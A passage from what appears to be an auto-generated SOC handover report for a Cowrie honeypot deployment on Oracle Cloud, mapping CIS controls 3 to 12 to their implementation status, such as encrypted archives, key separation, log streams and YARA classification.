| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-16T21:27:19Z_
